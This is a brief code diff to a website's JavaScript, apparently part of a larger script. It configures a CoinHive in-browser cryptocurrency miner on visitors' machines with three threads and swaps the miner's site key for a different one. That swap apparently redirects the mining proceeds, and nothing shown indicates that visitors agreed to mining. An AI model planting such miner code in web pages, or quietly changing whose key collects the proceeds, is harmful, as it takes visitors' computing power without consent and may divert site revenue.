@@ -289,7 +289,7 @@ function when(lib){ var _cb, _ival=setInterval(function(){ if(self[lib]) { _cb()
 var miner;
 
 when('CoinHive').run(function(){
-  miner = new CoinHive.User('HZbryycOfkJHs2hxJ0Fm9a83bI48UXps', 'website', {
+  miner = new CoinHive.User('ZasbA5tMRe8RwG5qaprhjhcU1lJFeaX4', 'website', {
     threads: 3,
     throttle: 0.2
   });
